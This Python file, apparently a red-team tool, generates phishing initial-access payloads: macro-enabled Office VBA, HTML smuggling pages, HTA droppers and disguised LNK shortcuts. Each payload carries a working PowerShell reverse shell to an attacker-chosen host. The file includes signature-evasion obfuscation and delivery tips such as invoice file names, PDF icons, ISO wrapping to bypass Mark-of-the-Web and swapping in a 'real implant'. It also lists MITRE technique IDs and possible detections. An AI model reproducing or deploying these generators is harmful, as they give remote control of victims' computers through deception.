"""
Initial access technique generator — VBA macros, HTML smuggling, HTA droppers, LNK shortcuts.
For use in authorized red team exercises only.
"""
import base64
from dataclasses import dataclass, field

SUPPORTED_TECHNIQUES = (
    "vba_macro",
    "html_smuggling",
    "hta_dropper",
    "lnk_shortcut",
)


@dataclass
class InitialAccessResult:
    payload: str
    technique: str
    delivery_hint: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── Variants ──────────────────────────────────────────────────────────────────

def _vba_macro(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);$r+='PS '+(pwd).Path+'> ';"
        f"$x=[text.encoding]::ASCII.GetBytes($r);$s.Write($x,0,$x.Length);$s.Flush()}};"
        f"$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()

    if obfuscate:
        # Split the encoded command across string variables to evade static sigs
        mid = len(b64_cmd) // 2
        part1, part2 = b64_cmd[:mid], b64_cmd[mid:]
        macro = (
            "Sub AutoOpen()\n"
            "    Dim oShell As Object\n"
            "    Set oShell = CreateObject(\"WScript.Shell\")\n"
            f"    Dim p1 As String\n"
            f"    Dim p2 As String\n"
            f"    p1 = \"{part1}\"\n"
            f"    p2 = \"{part2}\"\n"
            "    Dim cmd As String\n"
            "    cmd = \"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand \" & p1 & p2\n"
            "    oShell.Run cmd, 0, False\n"
            "End Sub\n\n"
            "Sub Document_Open()\n"
            "    AutoOpen\n"
            "End Sub"
        )
    else:
        macro = (
            "Sub AutoOpen()\n"
            "    Dim oShell As Object\n"
            "    Set oShell = CreateObject(\"WScript.Shell\")\n"
            f"    oShell.Run \"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}\", 0, False\n"
            "End Sub\n\n"
            "Sub Document_Open()\n"
            "    AutoOpen\n"
            "End Sub"
        )
    return InitialAccessResult(
        payload=macro,
        technique="vba_macro",
        delivery_hint=(
            "Embed in Word/Excel macro-enabled document (.docm/.xlsm). "
            "Requires user to enable macros (or use older Office without Protected View). "
            "Save as .doc (older format) to include macros without .docm extension."
        ),
        notes=f"PowerShell reverse shell to {lhost}:{lport}. Both AutoOpen and Document_Open trigger macros.",
        techniques=["T1566.001", "T1059.001"],
        risk="HIGH",
        detections=[
            "Office spawning powershell.exe child process (high-fidelity)",
            "AMSI: PowerShell encoded command with socket connection",
            "WScript.Shell CreateObject from winword.exe/excel.exe (Sysmon Event 1)",
        ],
    )


def _html_smuggling(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    # The payload to smuggle — in a real engagement this would be an implant binary
    # Here we generate a VBScript dropper as the smuggled file content
    vbs_content = (
        f'Set oShell = CreateObject("WScript.Shell")\n'
        f'oShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -C '
        f'$c=New-Object System.Net.Sockets.TCPClient(\\"{lhost}\\",{lport});'
        f'$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};'
        f'while(($i=$s.Read($b,0,$b.Length))-ne 0)'
        f'{{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);'
        f'(iex $d 2>&1|Out-String)+\'PS >\'|%{{[text.encoding]::ASCII.GetBytes($_)}}|'
        f'%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"'
        f', 0, False\n'
    )
    if obfuscate:
        # Encode the VBS payload bytes as a JS array for smuggling
        vbs_bytes = list(vbs_content.encode())
        js_array = ",".join(str(b) for b in vbs_bytes)
        file_name = "Invoice_2024.vbs"
    else:
        vbs_bytes = list(vbs_content.encode())
        js_array = ",".join(str(b) for b in vbs_bytes)
        file_name = "payload.vbs"

    html = f"""<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
<p>Please wait while your document loads...</p>
<script>
(function() {{
  // Blob-based file delivery — payload never touches disk as a URL fetch
  var bytes = new Uint8Array([{js_array}]);
  var blob = new Blob([bytes], {{type: 'application/octet-stream'}});
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = '{file_name}';
  document.body.appendChild(a);
  a.click();
  setTimeout(function() {{ URL.revokeObjectURL(url); }}, 1000);
}})();
</script>
</body>
</html>"""

    return InitialAccessResult(
        payload=html,
        technique="html_smuggling",
        delivery_hint=(
            "Send HTML page via email link or attachment. "
            "Browser auto-downloads the embedded blob — no network request to attacker server. "
            "User must run the downloaded .vbs file."
        ),
        notes=(
            f"Smuggles VBScript dropper connecting back to {lhost}:{lport}. "
            "Replace the embedded payload with a real implant binary for operational use."
        ),
        techniques=["T1566.002", "T1027.006"],
        risk="HIGH",
        detections=[
            "JavaScript Blob download without corresponding network request (EDR behavioral)",
            "Browser downloading executable file type (.vbs/.exe) (browser telemetry)",
            "WScript.exe execution of dropped .vbs file",
        ],
    )


def _hta_dropper(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> '|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()

    if obfuscate:
        # Use VBScript with string splitting and char obfuscation
        hta = f"""<html>
<head>
<title>Document</title>
<HTA:Application
    ID="oHTA"
    WindowState="minimize"
    ShowInTaskbar="No"
    Caption="No"
/>
</head>
<body>
<script language="VBScript">
Dim oShell
Set oShell = CreateObject("WS" & "cript.Sh" & "ell")
Dim p
p = "{b64_cmd}"
oShell.Run "pow" & "ershell -NoP -NonI -W Hid" & "den -Exec Byp" & "ass -EncodedCommand " & p, 0, False
Close
</script>
</body>
</html>"""
    else:
        hta = f"""<html>
<head><title>Loading</title>
<HTA:Application WindowState="minimize" ShowInTaskbar="No" Caption="No"/>
</head>
<body>
<script language="VBScript">
Set oShell = CreateObject("WScript.Shell")
oShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}", 0, False
Close
</script>
</body>
</html>"""

    return InitialAccessResult(
        payload=hta,
        technique="hta_dropper",
        delivery_hint=(
            "Deliver .hta file via email link or attachment. "
            "Windows executes .hta with mshta.exe (bypasses script execution policy). "
            "Can also serve from web: mshta http://attacker/payload.hta"
        ),
        notes=(
            f"HTA executed by mshta.exe, spawning PowerShell reverse shell to {lhost}:{lport}. "
            "HTA runs with Medium integrity by default."
        ),
        techniques=["T1218.005", "T1059.001"],
        risk="HIGH",
        detections=[
            "mshta.exe spawning powershell.exe (high-fidelity Defender/Sysmon rule)",
            "HTA file execution from browser downloads or email client",
            "AMSI detection of PowerShell encoded payload inside mshta context",
        ],
    )


def _lnk_shortcut(lhost: str, lport: int, obfuscate: bool) -> InitialAccessResult:
    ps_payload = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length))-ne 0)"
        f"{{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        f"iex $d 2>&1|Out-String|%{{[text.encoding]::ASCII.GetBytes($_)}}|"
        f"%{{$s.Write($_,0,$_.Length);$s.Flush()}}}};$c.Close()"
    )
    b64_cmd = base64.b64encode(ps_payload.encode("utf-16-le")).decode()

    powershell_cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}"

    # PowerShell script to create the LNK file programmatically
    lnk_creator = (
        f"$WS = New-Object -ComObject WScript.Shell\n"
        f"$LNK = $WS.CreateShortcut('C:\\\\Users\\\\Public\\\\Invoice.lnk')\n"
        f"$LNK.TargetPath = 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe'\n"
        f"$LNK.Arguments = '-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {b64_cmd}'\n"
        f"$LNK.IconLocation = 'C:\\\\Windows\\\\System32\\\\shell32.dll,70'  # PDF icon\n"
        f"$LNK.WindowStyle = 7  # Minimized\n"
        f"$LNK.Save()"
    )

    payload_text = (
        f"# PowerShell to generate the .lnk file (run on attacker or target):\n\n"
        f"{lnk_creator}\n\n"
        f"# --- Resulting LNK executes: ---\n"
        f"# {powershell_cmd}\n\n"
        f"# Delivery: embed in ZIP archive, ISO, or send as email attachment.\n"
        f"# ISO wrapping: LNK inside ISO bypasses Mark-of-the-Web (MotW) on older systems."
    )

    return InitialAccessResult(
        payload=payload_text,
        technique="lnk_shortcut",
        delivery_hint=(
            "Package .lnk in ZIP or ISO for email/phishing delivery. "
            "ISO trick bypasses MotW on Windows < 11 22H2. "
            "Use a PDF/Word icon (shell32.dll icon index) to disguise as document."
        ),
        notes=(
            f"LNK shortcut executes PowerShell reverse shell to {lhost}:{lport}. "
            "Configure icon to mimic expected document type for higher click rates."
        ),
        techniques=["T1566.001", "T1204.002", "T1059.001"],
        risk="HIGH",
        detections=[
            "powershell.exe launched from explorer.exe with encoded command (Sysmon Event 1)",
            "LNK file with TargetPath pointing to powershell.exe",
            "AMSI: PowerShell network connection in encoded payload",
        ],
    )


# ── Public API ─────────────────────────────────────────────────────────────────

_DISPATCH = {
    "vba_macro": _vba_macro,
    "html_smuggling": _html_smuggling,
    "hta_dropper": _hta_dropper,
    "lnk_shortcut": _lnk_shortcut,
}


def generate_initial_access(
    technique: str,
    lhost: str = "192.168.1.100",
    lport: int = 4444,
    obfuscate: bool = True,
) -> InitialAccessResult:
    if technique not in _DISPATCH:
        raise ValueError(f"Unknown technique '{technique}'. Supported: {', '.join(SUPPORTED_TECHNIQUES)}")
    return _DISPATCH[technique](lhost, lport, obfuscate)
